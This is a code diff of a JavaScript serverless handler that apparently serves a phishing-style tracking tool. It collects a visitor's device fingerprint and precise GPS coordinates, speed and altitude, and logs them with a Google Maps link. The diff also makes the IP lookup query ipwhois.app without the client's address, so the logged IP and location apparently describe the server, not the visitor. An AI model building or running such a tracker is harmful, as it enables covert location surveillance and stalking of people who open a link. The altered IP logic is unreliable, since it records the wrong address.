@@ -12,23 +12,42 @@ export async function handler(event) {
   const data = JSON.parse(event.body || "{}");
 
   const {
-    Os, Ptf, Cc, Ram, Ven, Ren, Ht, Wd, Brw,
-    Status, Lat, Lon, Acc, Alt, Dir, Spd, Error
+    Os,
+    Ptf,
+    Cc,
+    Ram,
+    Ven,
+    Ren,
+    Ht,
+    Wd,
+    Brw,
+    Status,
+    Lat,
+    Lon,
+    Acc,
+    Alt,
+    Dir,
+    Spd,
+    Error,
   } = data;
 
-  const clientIp =
-    event.headers["x-forwarded-for"]?.split(",")[0] || "Unknown IP";
+  // Fetch IP info
+  const ipRes = await fetch("https://ipwhois.app/json/");
+  const ipInfo = await ipRes.json();
 
-  // Fetch IP geo info
-  let ipInfo = {};
-  try {
-    const geoRes = await fetch(`https://ipapi.co/${clientIp}/json`);
-    ipInfo = await geoRes.json();
-  } catch (err) {
-    console.log(`${R}[-] Failed to fetch IP info: ${err}${W}`);
-  }
-  console.log(ipInfo)
-  // Device Info
+  const {
+    ip,
+    continent,
+    country,
+    region,
+    city,
+    org,
+    isp,
+    latitude,
+    longitude,
+  } = ipInfo;
+
+  // Log Device Info
   console.log(`${Y}[!] Device Information :${W}`);
   console.log(`${G}[+] ${C}OS         : ${W}${Os}`);
   console.log(`${G}[+] ${C}Platform   : ${W}${Ptf}`);
@@ -38,34 +57,30 @@ export async function handler(event) {
   console.log(`${G}[+] ${C}GPU        : ${W}${Ren}`);
   console.log(`${G}[+] ${C}Resolution : ${W}${Ht}x${Wd}`);
   console.log(`${G}[+] ${C}Browser    : ${W}${Brw}`);
-  console.log(`${G}[+] ${C}Public IP  : ${W}${clientIp}`);
+  console.log(`${G}[+] ${C}Public IP  : ${W}${ip}`);
 
-  // IP Info
-  if (ipInfo && ipInfo.ip) {
-    console.log(`${Y}[!] IP Information :${W}`);
-    console.log(`${G}[+] ${C}Continent : ${W}${ipInfo.continent_name}`);
-    console.log(`${G}[+] ${C}Country   : ${W}${ipInfo.country_name}`);
-    console.log(`${G}[+] ${C}Region    : ${W}${ipInfo.region}`);
-    console.log(`${G}[+] ${C}City      : ${W}${ipInfo.city}`);
-    console.log(`${G}[+] ${C}Org       : ${W}${ipInfo.org}`);
-    console.log(`${G}[+] ${C}ISP       : ${W}${ipInfo.org}`);
-  }
+  // Log IP Info
+  console.log(`\n${Y}[!] IP Information :${W}`);
+  console.log(`${G}[+] ${C}Continent : ${W}${continent}`);
+  console.log(`${G}[+] ${C}Country   : ${W}${country}`);
+  console.log(`${G}[+] ${C}Region    : ${W}${region}`);
+  console.log(`${G}[+] ${C}City      : ${W}${city}`);
+  console.log(`${G}[+] ${C}Org       : ${W}${org}`);
+  console.log(`${G}[+] ${C}ISP       : ${W}${isp}`);
 
-  // Location Info
+  // Log Location Info (if available)
   if (Status === "success") {
-    console.log(`${Y}[!] Location Information :${W}`);
+    console.log(`\n${Y}[!] Location Information :${W}`);
     console.log(`${G}[+] ${C}Latitude  : ${W}${Lat}`);
     console.log(`${G}[+] ${C}Longitude : ${W}${Lon}`);
     console.log(`${G}[+] ${C}Accuracy  : ${W}${Acc}`);
     console.log(`${G}[+] ${C}Altitude  : ${W}${Alt}`);
     console.log(`${G}[+] ${C}Direction : ${W}${Dir}`);
     console.log(`${G}[+] ${C}Speed     : ${W}${Spd}`);
-    console.log(
-      `${G}[+] ${C}Google Maps : ${W}https://www.google.com/maps/place/${Lat?.replace(
-        " deg",
-        ""
-      )}+${Lon?.replace(" deg", "")}`
-    );
+    console.log(`${G}[+] ${C}Google Maps : ${W}https://www.google.com/maps/place/${Lat?.replace(
+      " deg",
+      ""
+    )}+${Lon?.replace(" deg", "")}`);
   } else {
     console.log(`${R}[-] ${C}Location Error: ${R}${Error}${W}`);
   }
